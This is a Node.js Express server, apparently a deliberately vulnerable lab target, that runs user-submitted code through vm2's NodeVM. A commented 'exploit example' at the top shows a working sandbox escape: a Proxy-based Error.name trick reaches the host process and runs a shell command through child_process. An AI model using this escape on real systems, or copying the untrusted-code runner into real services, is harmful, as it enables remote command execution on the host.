// exploit example
// ##########################################
// const err = new Error();
// err.name = {
//   toString: new Proxy(() => "", {
//     apply(target, thiz, args) {
//       const process = args.constructor.constructor("return process")();
//       throw process.mainModule.require("child_process").execSync("touch /tmp/pwned").toString();
//     },
//   }),
// };
// try {
//   err.stack;
// } catch (stdout) {
//   stdout;
// }

const express = require('express');
const bodyParser = require('body-parser');
const { NodeVM } = require('vm2');
const app = express();
const path = require('path');

// Middleware to serve static files
app.use(express.static('static'));

// Middleware to parse text/plain content
app.use(bodyParser.text({ type: 'text/plain' }));

// Default route serving index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'static', 'index.html'));
});

// Route for executing code
app.post('/run', (req, res) => {
    const userCode = req.body;
    let consoleOutput = []; // Array to store console outputs
    try {
        const vm = new NodeVM({
            console:'redirect',
            sandbox: {},
            // require: {
            //     external: true, // Note: be very cautious with this in real applications
            //     builtin: ['fs', 'path'], // Note: be very cautious with this in real applications
            // }
        });

        vm.on('console.log', (...data) => {
          consoleOutput.push(data.join(' '));
        });

        vm.run(userCode);

        // Send a structured JSON object
        res.json({output:consoleOutput});
    } catch (error) {
        res.status(500).send(`Error: ${error.message}`);
    }
});

// Start server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
